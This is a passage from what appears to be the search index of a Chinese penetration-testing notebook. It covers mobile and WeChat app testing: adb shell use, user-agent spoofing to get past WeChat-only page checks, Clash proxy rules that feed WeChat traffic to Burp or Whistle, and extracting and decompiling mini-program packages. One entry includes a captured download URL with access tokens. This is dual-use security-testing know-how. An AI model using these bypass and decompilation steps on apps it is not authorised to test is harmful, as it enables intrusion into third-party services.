\u5b89\u88c5\u540e\u901a\u8fc7proxifier\u6216\u8005clash\u8bbe\u7f6e\u4ee3\u7406\u5373\u53ef\u5b8c\u6210\u6293\u5305\uff0c\u723d\u7684\u4e00\u3002\u800c\u4e14ios\u7aef\u7684app\u9632\u62a4\u5565\u7684\u90fd\u4e0d\u5982\u5b89\u5353\uff0c\u53ef\u4ee5\u8bf4\u662f\u5f88\u9e21\u513f\u723d\u3002","title":"mac\u6293\u5305"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/#adb","text":"adb\u53ef\u4ee5\u8fde\u63a5\u5b89\u5353\u7684shell\uff0c\u5f88\u597d\u7528\u3002 \u8fdc\u7a0b\u8fde\u63a5 \u5148\u63d2\u4e0ausb adb devices \u67e5\u770b\u662f\u5426\u8fde\u63a5\u4e0a adb tcpip 5555 \u5f00\u542f\u624b\u673a5555\u8c03\u8bd5\u7aef\u53e3 adb connect ip:port \u8fde\u63a5\u624b\u673a\u8c03\u8bd5\u7aef\u53e3 adb shell \u8fdbshell \u8fdc\u7a0b\u5b89\u88c5apk adb logcat \u5f00\u542flogcat adb install -r ~/Downloads/TPLAppPersonInsuAdrPhone.2.4.4.1100.apk","title":"adb\u4f7f\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%BE%AE%E4%BF%A1/","text":"\u5fae\u4fe1 \u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u6e17\u900f \u516c\u4f17\u53f7\u6e17\u900f","title":"\u5fae\u4fe1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%BE%AE%E4%BF%A1/#_1","text":"\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u6e17\u900f \u516c\u4f17\u53f7\u6e17\u900f","title":"\u5fae\u4fe1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/","text":"\u516c\u4f17\u53f7\u6e17\u900f \u76ee\u5f55 \u83b7\u53d6\u5404url \u53f3\u4e0a\u89d2\u4e09\u4e2a\u70b9 vconsole \u7535\u8111\u7aef\u8bbf\u95ee\u7ed5\u8fc7 \u66f4\u6539UA\u7ed5\u8fc7 \u7ed5\u8fc7oauth clash+whistle clash+burp \u83b7\u53d6\u5404url \u53f3\u4e0a\u89d2\u4e09\u4e2a\u70b9 \u7535\u8111\u7aef\uff0c\u53ef\u4ee5\u4ece\u8fd9\u91cc\u83b7\u53d6\u94fe\u63a5 vconsole \u7535\u8111\u7aef\u6709\u4e9b\u65f6\u5019\u53f3\u4e0a\u89d2\u4e09\u4e2a\u70b9\uff0c\u70b9\u51fb\u540e\u6ca1\u6709\u590d\u5236\u94fe\u63a5\u9009\u9879\uff0c\u53ef\u4ee5\u70b9\u51fb\u53f3\u4e0b\u89d2vConsole\u2192Log\u627e\u5230url\u4e00\u884c\u5373\u53ef\u5f97\u5230url \u7535\u8111\u7aef\u8bbf\u95ee\u7ed5\u8fc7 \u5f53\u6211\u4eec\u76f4\u63a5\u628a\u516c\u4f17\u53f7\u91cc\u7ed9\u7684\u94fe\u63a5\u62ff\u5230\u7535\u8111\u8bbf\u95ee\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u8fd9\u79cd\u73a9\u610f\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u8fd9\u79cd\u64cd\u86cb\u73a9\u610f\uff09 \u6211\u4eec\u5f97\u8fdb\u884c\u7ed5\u8fc7 \u66f4\u6539UA\u7ed5\u8fc7 \u5982\u679c\u6d4f\u89c8\u5668\u6253\u5f00\u540e\u4f1a\u8df3\u8f6c\u5230\u5176\u4ed6\u9875\u9762 \u6216\u8005 \u6709\u5f39\u7a97\u63d0\u793a\uff0c\u4f46\u662f\u4e0d\u4f1a\u8df3\u5230open.weixin.qq.com\u57df\u540d\u53bb\uff0c\u5c31\u53ef\u4ee5\u5c1d\u8bd5UA\u7ed5\u8fc7\u3002 \u4fee\u6539\u65b9\u5f0f\u6709\u4e24\u79cd\uff1a 1.F12\u2192\u53f3\u4fa7\u4e09\u4e2a\u70b9\u2192more tools\u2192network conditions\u2192User agent\u2192\u53d6\u6d88\u52fe\u9009Use Browser default\u2192\u8f93\u5165UA\u540e\u5237\u65b0 2.F12\u2192\u5de6\u4fa7\u7b2c\u4e8c\u4e2a\u6807\u8bc6\u70b9\u51fb\u8fdb\u5165\u624b\u673a\u6a21\u5f0f\u6d4f\u89c8\u2192\u4e0a\u65b9dimensions\u9009\u4e2dedit\u2192add custom device\u2192\u8f93\u5165ua\u540d\uff08\u968f\u4fbf\u8f93\uff0c\u6211\u8f93\u7684weixin\uff09\uff0c\u7136\u540e\u8f93\u5165ua\uff0c\u4fdd\u5b58\u2192dimensions\u91cc\u9009\u62e9weixin\u5373\u53ef\u5207\u6362ua \u4fee\u6539\u6210\u5982\u4e0bua\uff08\u5206\u522b\u8bd5\u8bd5\uff09\uff08\u4e3b\u8981\u662f\u68c0\u6d4bua\u5934\u91cc\u662f\u5426\u6709MicroMessenger\u5b57\u7b26\uff0c\u6709\u4e9b\u7ad9ua\u53ea\u6709\u4e2aMicroMessenger\u4e5f\u80fd\u7ed5\u8fc7\uff09 Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/5.4.1 NetType/WIFI Mozilla/5.0 (Linux; U; Android 4.1.2; zh-cn; Chitanda/Akari) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 MicroMessenger/6.0.0.58_r884092.501 NetType/WIFI \u7ed5\u8fc7oauth \u5982\u679c\u6211\u4eec\u628aua\u6539\u4e86\uff0c\u53d1\u73b0\u9875\u9762\u53d8\u6210\u7eaf\u767d\u8272\uff0c\u8bf7\u7528\u5fae\u4fe1\u5ba2\u6237\u7aef\u6253\u5f00\u7684\u5b57\u6837\u4e5f\u6ca1\u4e86\uff0c\u90a3\u4e48\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u7ed5\u8fc7oauth\u6765\u8bbf\u95ee\u3002 //todo,\u4e0d\u8fc7\u6709\u4e0b\u9762\u4e24\u4e2a\u89e3\u51b3\u65b9\u6848\u4e86\uff0c\u4e5f\u4e0d\u662f\u90a3\u4e48\u6025 clash+whistle clash\u5f00\u5168\u5c40\u4ee3\u7406\uff0c\u7136\u540e\u628a\u6d41\u91cf\u5168\u90e8\u5bfc\u5230\u6293\u5305\u5de5\u5177\uff08whistle\uff09\u8fdb\u884c\u5206\u6790\u3002 \u4e3a\u4ec0\u4e48\u4e0d\u7528burp\u5462\uff1f\u56e0\u4e3a\u6211mao\u5728burp\u53ef\u80fd\u4f1a\u9047\u5230\u4e00\u4e9b\u8bc1\u4e66\u95ee\u9898\u5bfc\u81f4\u6253\u4e0d\u5f00\u7f51\u9875\u3002 \u4fdd\u5b58\u4e3ayml(macos\u662fyaml\uff09\u5bfc\u5165\u5230clash proxies: - name: Whistle type: http server: 127.0.0.1 port: 8899 #\u6839\u636e\u6293\u5305\u5de5\u5177\u914d\u7f6e proxy-groups: - name: Proxy proxies: - Whistle type: select rules: - PROCESS-NAME,node.exe,DIRECT - PROCESS-NAME,WeChatAppEx.exe,Whistle - PROCESS-NAME,WeChat.exe,Whistle - PROCESS-NAME,WechatBrowser.exe,Whistle - MATCH,DIRECT \u53ef\u4ee5\u5728rules\u91cc\u52a0 -DOMAIN,xxxx,DIRECT \u6765\u5c4f\u853d\u4e00\u4e9b\u5783\u573e\u5305 \u7136\u540e\u542f\u52a8whistle\u5c31\u80fd\u6293\u5305\u4e86\u3002 clash+burp \u4e00\u6837\u7684\uff0c\u5c31\u662f\u628aclash\u4ee3\u7406\u7aef\u53e3\u6539\u6210burp\u7684\u3002\u53ef\u80fd\u4f1a\u9047\u5230\u8bc1\u4e66\u95ee\u9898\uff0c\u4e0d\u80fd\u7528\u5c31\u4e0awhistle\u5427\u3002 proxies: - name: burp type: http server: 127.0.0.1 port: 8080 #\u6839\u636e\u6293\u5305\u5de5\u5177\u914d\u7f6e proxy-groups: - name: Proxy proxies: - burp type: select rules: - MATCH,burp","title":"\u516c\u4f17\u53f7\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/#_1","text":"","title":"\u516c\u4f17\u53f7\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/#_2","text":"\u83b7\u53d6\u5404url \u53f3\u4e0a\u89d2\u4e09\u4e2a\u70b9 vconsole \u7535\u8111\u7aef\u8bbf\u95ee\u7ed5\u8fc7 \u66f4\u6539UA\u7ed5\u8fc7 \u7ed5\u8fc7oauth clash+whistle clash+burp","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/#url","text":"","title":"\u83b7\u53d6\u5404url"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/#_3","text":"\u7535\u8111\u7aef\uff0c\u53ef\u4ee5\u4ece\u8fd9\u91cc\u83b7\u53d6\u94fe\u63a5","title":"\u53f3\u4e0a\u89d2\u4e09\u4e2a\u70b9"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/#vconsole","text":"\u7535\u8111\u7aef\u6709\u4e9b\u65f6\u5019\u53f3\u4e0a\u89d2\u4e09\u4e2a\u70b9\uff0c\u70b9\u51fb\u540e\u6ca1\u6709\u590d\u5236\u94fe\u63a5\u9009\u9879\uff0c\u53ef\u4ee5\u70b9\u51fb\u53f3\u4e0b\u89d2vConsole\u2192Log\u627e\u5230url\u4e00\u884c\u5373\u53ef\u5f97\u5230url","title":"vconsole"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/#_4","text":"\u5f53\u6211\u4eec\u76f4\u63a5\u628a\u516c\u4f17\u53f7\u91cc\u7ed9\u7684\u94fe\u63a5\u62ff\u5230\u7535\u8111\u8bbf\u95ee\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u8fd9\u79cd\u73a9\u610f\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u8fd9\u79cd\u64cd\u86cb\u73a9\u610f\uff09 \u6211\u4eec\u5f97\u8fdb\u884c\u7ed5\u8fc7","title":"\u7535\u8111\u7aef\u8bbf\u95ee\u7ed5\u8fc7"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/#ua","text":"\u5982\u679c\u6d4f\u89c8\u5668\u6253\u5f00\u540e\u4f1a\u8df3\u8f6c\u5230\u5176\u4ed6\u9875\u9762 \u6216\u8005 \u6709\u5f39\u7a97\u63d0\u793a\uff0c\u4f46\u662f\u4e0d\u4f1a\u8df3\u5230open.weixin.qq.com\u57df\u540d\u53bb\uff0c\u5c31\u53ef\u4ee5\u5c1d\u8bd5UA\u7ed5\u8fc7\u3002 \u4fee\u6539\u65b9\u5f0f\u6709\u4e24\u79cd\uff1a 1.F12\u2192\u53f3\u4fa7\u4e09\u4e2a\u70b9\u2192more tools\u2192network conditions\u2192User agent\u2192\u53d6\u6d88\u52fe\u9009Use Browser default\u2192\u8f93\u5165UA\u540e\u5237\u65b0 2.F12\u2192\u5de6\u4fa7\u7b2c\u4e8c\u4e2a\u6807\u8bc6\u70b9\u51fb\u8fdb\u5165\u624b\u673a\u6a21\u5f0f\u6d4f\u89c8\u2192\u4e0a\u65b9dimensions\u9009\u4e2dedit\u2192add custom device\u2192\u8f93\u5165ua\u540d\uff08\u968f\u4fbf\u8f93\uff0c\u6211\u8f93\u7684weixin\uff09\uff0c\u7136\u540e\u8f93\u5165ua\uff0c\u4fdd\u5b58\u2192dimensions\u91cc\u9009\u62e9weixin\u5373\u53ef\u5207\u6362ua \u4fee\u6539\u6210\u5982\u4e0bua\uff08\u5206\u522b\u8bd5\u8bd5\uff09\uff08\u4e3b\u8981\u662f\u68c0\u6d4bua\u5934\u91cc\u662f\u5426\u6709MicroMessenger\u5b57\u7b26\uff0c\u6709\u4e9b\u7ad9ua\u53ea\u6709\u4e2aMicroMessenger\u4e5f\u80fd\u7ed5\u8fc7\uff09 Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/5.4.1 NetType/WIFI Mozilla/5.0 (Linux; U; Android 4.1.2; zh-cn; Chitanda/Akari) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 MicroMessenger/6.0.0.58_r884092.501 NetType/WIFI","title":"\u66f4\u6539UA\u7ed5\u8fc7"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/#oauth","text":"\u5982\u679c\u6211\u4eec\u628aua\u6539\u4e86\uff0c\u53d1\u73b0\u9875\u9762\u53d8\u6210\u7eaf\u767d\u8272\uff0c\u8bf7\u7528\u5fae\u4fe1\u5ba2\u6237\u7aef\u6253\u5f00\u7684\u5b57\u6837\u4e5f\u6ca1\u4e86\uff0c\u90a3\u4e48\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u7ed5\u8fc7oauth\u6765\u8bbf\u95ee\u3002 //todo,\u4e0d\u8fc7\u6709\u4e0b\u9762\u4e24\u4e2a\u89e3\u51b3\u65b9\u6848\u4e86\uff0c\u4e5f\u4e0d\u662f\u90a3\u4e48\u6025","title":"\u7ed5\u8fc7oauth"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/#clashwhistle","text":"clash\u5f00\u5168\u5c40\u4ee3\u7406\uff0c\u7136\u540e\u628a\u6d41\u91cf\u5168\u90e8\u5bfc\u5230\u6293\u5305\u5de5\u5177\uff08whistle\uff09\u8fdb\u884c\u5206\u6790\u3002 \u4e3a\u4ec0\u4e48\u4e0d\u7528burp\u5462\uff1f\u56e0\u4e3a\u6211mao\u5728burp\u53ef\u80fd\u4f1a\u9047\u5230\u4e00\u4e9b\u8bc1\u4e66\u95ee\u9898\u5bfc\u81f4\u6253\u4e0d\u5f00\u7f51\u9875\u3002 \u4fdd\u5b58\u4e3ayml(macos\u662fyaml\uff09\u5bfc\u5165\u5230clash proxies: - name: Whistle type: http server: 127.0.0.1 port: 8899 #\u6839\u636e\u6293\u5305\u5de5\u5177\u914d\u7f6e proxy-groups: - name: Proxy proxies: - Whistle type: select rules: - PROCESS-NAME,node.exe,DIRECT - PROCESS-NAME,WeChatAppEx.exe,Whistle - PROCESS-NAME,WeChat.exe,Whistle - PROCESS-NAME,WechatBrowser.exe,Whistle - MATCH,DIRECT \u53ef\u4ee5\u5728rules\u91cc\u52a0 -DOMAIN,xxxx,DIRECT \u6765\u5c4f\u853d\u4e00\u4e9b\u5783\u573e\u5305 \u7136\u540e\u542f\u52a8whistle\u5c31\u80fd\u6293\u5305\u4e86\u3002","title":"clash+whistle"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%B8%97%E9%80%8F/#clashburp","text":"\u4e00\u6837\u7684\uff0c\u5c31\u662f\u628aclash\u4ee3\u7406\u7aef\u53e3\u6539\u6210burp\u7684\u3002\u53ef\u80fd\u4f1a\u9047\u5230\u8bc1\u4e66\u95ee\u9898\uff0c\u4e0d\u80fd\u7528\u5c31\u4e0awhistle\u5427\u3002 proxies: - name: burp type: http server: 127.0.0.1 port: 8080 #\u6839\u636e\u6293\u5305\u5de5\u5177\u914d\u7f6e proxy-groups: - name: Proxy proxies: - burp type: select rules: - MATCH,burp","title":"clash+burp"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/","text":"\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u6e17\u900f \u76ee\u5f55 \u5c0f\u7a0b\u5e8f\u6293\u5305 clash+burp \u5b89\u5353\u6a21\u62df\u5668\u9006\u5411\uff08windows\uff09 \u6293\u5305\u9006\u5411\uff08windows\\&linux\u53ef\u7528\uff09 \u6e90\u7801\u5206\u6790 \u901a\u8fc7linkfinder\u627e\u8def\u7531 \u770b\u6e90\u7801\u627e\u6f0f\u6d1e AppSecret\u6cc4\u6f0f \u5c0f\u7a0b\u5e8f\u6293\u5305\u7684\u5751 \u5c0f\u7a0b\u5e8f\u6293\u5305 clash+burp clash+burp\uff0c\u8be6\u7ec6\u53c2\u8003\u516c\u4f17\u53f7\u6e17\u900f\uff0c\u4e00\u6837\u7684 \u5b89\u5353\u6a21\u62df\u5668\u9006\u5411\uff08windows\uff09 \u591c\u795e\u6a21\u62df\u56686.6.1.1\uff0c\u5b89\u5353\u7248\u672c5.0\uff0c\u6293\u5305\u6bd4\u9ad8\u7248\u672c\u66f4\u52a0\u65b9\u4fbf ref: https://forum.butian.net/share/1227 \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1vMVvmm2n2wyr3vhzp91iqA \u63d0\u53d6\u7801\uff1ajpho \u6293\u5305+\u5bf9\u5c0f\u7a0b\u5e8f\u6e90\u7801\u8fdb\u884c\u53cd\u7f16\u8bd1\u4ece\u800c\u8fdb\u884c\u5ba1\u8ba1 \u5148\u628a\u591c\u795e\u6a21\u62df\u5668\uff086.6\u7b49\u8001\u7248\u672c\uff09+burp\u914d\u597d\uff0c\u5927\u91cf\u53c2\u8003\u81earef\uff1a https://forum.butian.net/share/1227 \u5fae\u4fe1\u5bf9\u4e8e Mac \u548c Windows \u7684\u5c0f\u7a0b\u5e8f\u5305\u90fd\u505a\u4e86\u4e0d\u540c\u7a0b\u5ea6\u7684\u52a0\u5bc6\uff0c\u6240\u4ee5\u73b0\u5728\u4ece\u5b89\u5353/iOS\u7cfb\u7edf\u4e2d\u63d0\u53d6\u5c0f\u7a0b\u5e8f\u66f4\u4e3a\u65b9\u4fbf\u3002 \u7136\u540e\u968f\u4fbf\u8bbf\u95ee\u4e00\u4e2a\u5c0f\u7a0b\u5e8f\uff0c\u63a5\u4e0b\u6765\u4f1a\u5728\u624b\u673adata/data/com.tencent.mm/MicroMsg\u751f\u6210\u4e00\u4e2amd5\u52a0\u5bc6\u547d\u540d\u7684\u6587\u4ef6\u5939\uff08\u5982\u679c\u6253\u5f00\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u8fc7\u591a\uff0c\u540c\u65f6\u6709\u591a\u4e2a\u6587\u4ef6\u5939\u4e0d\u5bb9\u6613\u8bc6\u522b\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u9009\u62e9\u628a MicroMsg \u6587\u4ef6\u5939\u6240\u6709\u5185\u5bb9\u5220\u9664\u6389\uff0c\u518d\u53bb\u91cd\u65b0\u6253\u5f00\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\uff0c\u5c31\u4f1a\u5f97\u5230\u552f\u4e00\u4e00\u4e2aMD5\u52a0\u5bc6\u547d\u540d\u7684\u6587\u4ef6\u5939\u5566\uff09 \u5728\u8be5\u6587\u4ef6\u5939\u4e0b\u7684 appbrand/pkg \u76ee\u5f55\u4e0b\u627e\u5230 .wxapkg \u540e\u7f00\u7ed3\u5c3e\u7684\u6587\u4ef6\uff0c\u5176\u4e2d\u53ea\u6709\u51e0MB\u5927\u5c0f\u7684\u4e3a\u521a\u521a\u6253\u5f00\u7684\u5c0f\u7a0b\u5e8f\u7684\u6587\u4ef6 \u70b9\u51fb\u52fe\u9009\u4e4b\u540e\uff0c\u6765\u5230\u6839\u76ee\u5f55\u4e0b\u7684 mnt/shared/App \u76ee\u5f55\uff0c\u6253\u5f00\u53f3\u4e0a\u89d2\u4e09\u4e2a . \u7684\u529f\u80fd\u83dc\u5355\u9009\u62e9\u7c98\u8d34\u9009\u62e9\u9879\uff0c\u5c06\u6587\u4ef6\u590d\u5236\u5230\u8be5\u6587\u4ef6\u5939\uff0c\u7136\u540e\u8fdb\u5165\u5171\u4eab\u6587\u4ef6\u5939 \u5728\u5171\u4eab\u6587\u4ef6\u5939\u4e0bAppShare\u76ee\u5f55\u91cc\u5373\u53ef\u627e\u5230\u5171\u4eab\u51fa\u6765\u7684wxapkg\u6587\u4ef6\u3002 \u7136\u540e\u7528\u8fd9\u4e2a\u5de5\u5177\u8fdb\u884c\u53cd\u7f16\u8bd1\u3002\u8bb0\u5f97\u8981\u5148\u5b89\u88c5nodejs https://github.com/ezshine/wxapkg-convertor/releases \u628awxapkg\u62d6\u8fdb\u53bb\u5c31\u53ef\u4ee5\u628a\u6e90\u7801\u53cd\u7f16\u8bd1\u51fa\u6765\u4e86\u3002 \u6293\u5305\u9006\u5411\uff08windows\\&linux\u53ef\u7528\uff09 \u56e0\u4e3a\u662f\u76f4\u63a5\u5728\u6d41\u91cf\u4e2d\u622a\u53d6\u6e90\u7801\uff0c\u907f\u514d\u4e86\u672c\u5730\u7684\u52a0\u5bc6\u8fc7\u7a0b\uff0c\u66f4\u52a0\u65b9\u4fbf\u5feb\u6377\uff0c\u540c\u4e8b\u8bf4\u53ef\u4ee5\u89e390%\u4ee5\u4e0a\u7684\u5c0f\u7a0b\u5e8f 1.clash\u5f00\u542ftun mode\uff0csystem proxy\u548cservice mode 2.\u914d\u7f6e\u597dclash\u914d\u7f6e\u6587\u4ef6\uff0c\u628a\u5fae\u4fe1\u7684\u6d41\u91cf\u5bfc\u5230burp\u6216\u8005whistle proxies: - name: burp type: http server: 127.0.0.1 port: 8080 #\u6839\u636e\u6293\u5305\u5de5\u5177\u914d\u7f6e proxy-groups: - name: Proxy proxies: - burp type: select rules: - PROCESS-NAME,node.exe,DIRECT - PROCESS-NAME,WeChatAppEx.exe,burp - PROCESS-NAME,WeChat.exe,burp - PROCESS-NAME,WechatBrowser.exe,burp - MATCH,DIRECT proxies: - name: Whistle type: http server: 127.0.0.1 port: 8899 #\u6839\u636e\u6293\u5305\u5de5\u5177\u914d\u7f6e proxy-groups: - name: Proxy proxies: - Whistle type: select rules: - PROCESS-NAME,node.exe,DIRECT - PROCESS-NAME,WeChatAppEx.exe,Whistle - PROCESS-NAME,WeChat.exe,Whistle - PROCESS-NAME,WechatBrowser.exe,Whistle - MATCH,DIRECT 3.\u6293 res.servicewechat.com \u7684\u6d41\u91cf\u5305 1/2\u7406\u8bba\u4e0a\u53ef\u4ee5\u7528proxifier\u5b8c\u6210\uff0c\u4f46\u662f\u5b9e\u9645\u60c5\u51b5\u662f\u5f88\u96be\u7528\u4e0d\u63a8\u8350 # \u5c0f\u7a0b\u5e8f\u4e0b\u8f7d\u8bf7\u6c42\u5f62\u5f0f\u5982\u4e0b https://res.servicewechat.com/weapp/release_encrypt/69_XEb_bQn9udUfYNR-JhVrzjVqEdXICHsvegO2QCx6eRfFnUgifLzEh55WQ2gYz7lUGvcPGgF-j0NRGfdI.wxapkg?rand=1419492810&pass_key=3B0wUf6vtegibGza4UIFk-JgzYJ8xt8YzNpCYtSAAy9fXw5rtUEMDGv28x9pauh5OX_iiUbTf_vg5ycoY2M_j-yhuPYMsfLw8DbfVczLXIK-UVFkxB12TKSGj_EdZFM6pbooi9Dowzw44GZmS9rkZa42d2nZXVqok480-xideVzqbA1VPb77cCo_HfxD3G9ejrc7T1tpGghnrUtG01dg_hX_tgS9HUkKLPqElBTC5_Y~&ext_code=_bKqDGB7WZQDjN8kGrx9kJE7OgfsMfnH1M-wfX0ThiE \u6d4b\u8bd5\u7248\u8bf7\u6c42\u957f\u8fd9\u6837 https://servicewechat.com/weapp-test/experience/BXY4PweVMcpJVNkQOv_kKYjot6AWWPZCGAQTMV26mcw burp\u9700\u5728proxy\u8fc7\u6ee4\u5668\u91cc\u6dfb\u52a0other binary\u53ef\u89c1 whistle\u9700\u5728\u9876\u90e8\u680f\u4e2d\u7684https\u9009\u9879\u91cc\u5f00\u542f Capture TUNNEL CONNECTS 4.\u83b7\u53d6\u8def\u7531\u540e\uff0c\u76f4\u63a5\u628aurl\u653e\u5230\u6d4f\u89c8\u5668\u8fdb\u884c\u4e0b\u8f7d \u4e0b\u8f7d\u5305\u6709\u65f6\u5b58\u5728\u591a\u79cd\u683c\u5f0f\uff0c\u82e5\u540e\u7f00\u4e3awxapkg\u53ef\u76f4\u63a5\u7528\uff0c\u82e5\u540e\u7f00\u4e3azstd\uff0c\u5219\u9700\u8981\u4f7f\u7528zstd\u65b9\u5f0f\u89e3\u538b\u540e\u6dfb\u52a0wxapkg\u540e\u7f00\u518d\u4f7f\u7528\u3002\u6d4b\u8bd5\u7248\u4e0b\u4e0b\u6765\u52a0\u4e2awxapkg\u4e5f\u80fd\u76f4\u63a5\u7528 